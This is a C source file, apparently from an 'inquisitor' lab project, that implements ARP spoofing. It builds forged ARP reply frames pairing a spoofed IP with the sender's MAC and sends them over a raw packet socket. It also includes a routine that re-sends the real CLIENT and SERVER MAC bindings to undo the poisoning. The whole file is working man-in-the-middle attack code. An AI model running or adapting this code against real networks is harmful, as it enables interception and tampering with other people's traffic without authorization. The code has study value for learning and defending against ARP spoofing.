#include "poisoning.h"
#include "inquisitor.h"
#include "utils.h"
#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ether.h>
#include <netpacket/packet.h>
#include <unistd.h>
#include <string.h>

int get_hex_from_mac_addr(unsigned char *dest, const char *addr_str) {
	for (int i = 0; i < 6; i++) {
		if (sscanf(addr_str, "%hhx", &dest[i]) != 1) return (1);
		addr_str += 3;
	}
	return (0);
}

void build_arp_trame(t_arp_frame *frame, t_config config) {

	if (get_hex_from_mac_addr(frame->eth.dst_mac, config.target_mac) != 0)
		error("destination mac address resolution failed", 1, &config);
	if (get_hex_from_mac_addr(frame->eth.src_mac, config.local_mac) != 0)
		error("source mac address resolution failed", 1, &config);
	frame->eth.ether_type = htons(0x0806);

	frame->arp.hardware_type = htons(1);
	frame->arp.protocol_type = htons(0x0800);
	frame->arp.hardware_addr_len = 6;
	frame->arp.protocol_addr_len = 4;
	frame->arp.opcode = htons(2);

	if (get_hex_from_mac_addr(frame->arp.target_mac, config.target_mac) != 0)
		error("target mac address resolution failed", 1, &config);
	if (inet_pton(AF_INET, config.target_ip, frame->arp.target_ip) != 1)
		error("inet_pton failed", 1, &config);
	if (get_hex_from_mac_addr(frame->arp.sender_mac, config.local_mac) != 0)
		error("sender mac address resolution failed", 1, &config);
	if (inet_pton(AF_INET, config.spoof_ip, frame->arp.sender_ip) != 1)
		error("inet_pton failed", 1, &config);
}

int open_inject_socket(t_config config) {
	int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	if (fd == -1)
		error("could not create a raw packet arp", 1, &config);
	return fd;
}

int send_arp_frame(int fd, t_arp_frame *frame, const t_config config) {
	struct sockaddr_ll sockadr;
	sockadr.sll_family = AF_PACKET;
	sockadr.sll_ifindex = config.ifindex;
	sockadr.sll_halen = 6;
	
	// Use the destination MAC already set in the frame (copied to sockaddr for sendto)
	memcpy(sockadr.sll_addr, frame->eth.dst_mac, 6);

	if (sendto(fd, frame, sizeof(t_arp_frame), 0,
			(struct sockaddr *)&sockadr, sizeof(sockadr)) == -1)
		return -1;
	return 0;
}

void restore_arp(int fd, t_config config) {

	// Build 'in' frame: tell SERVER that CLIENT_IP is at CLIENT_MAC (real)
	t_config c_in = config;
	c_in.spoof_ip = config.target_ip;        // sender claims to be CLIENT_IP
	c_in.spoof_mac = config.target_mac;      // used for arp.sender_mac in restore
	c_in.target_ip = config.spoof_ip;        // send TO SERVER_IP
	c_in.target_mac = config.spoof_mac;      // send TO SERVER_MAC (used for eth.dst_mac)
	// Note: local_mac will be swapped below

	t_arp_frame in;
	build_arp_trame(&in, c_in);

	// Build 'out' frame: tell CLIENT that SERVER_IP is at SERVER_MAC (real)  
	t_config c_out = config;
	c_out.spoof_ip = config.spoof_ip;        // sender claims to be SERVER_IP
	c_out.spoof_mac = config.spoof_mac;      // used for arp.sender_mac in restore
	c_out.target_ip = config.target_ip;      // send TO CLIENT_IP
	c_out.target_mac = config.target_mac;    // send TO CLIENT_MAC (used for eth.dst_mac)

	t_arp_frame out;
	build_arp_trame(&out, c_out);

	// For restoration: ARP sender_mac should be the REAL victim MAC
	// (overriding what build_arp_trame set - that used config.target_mac/spoof_mac)
	get_hex_from_mac_addr(in.arp.sender_mac, config.target_mac);    // CLIENT_MAC
	get_hex_from_mac_addr(out.arp.sender_mac, config.spoof_mac);   // SERVER_MAC

	// Eth sender stays as attacker (who's physically sending the packets)

	// Send restoration packets quickly
	for (int i = 0; i < 5; i++) {
		send_arp_frame(fd, &in, c_in);
		send_arp_frame(fd, &out, c_out);
		usleep(100000); // 100ms instead of 1s for faster cleanup
	}
}
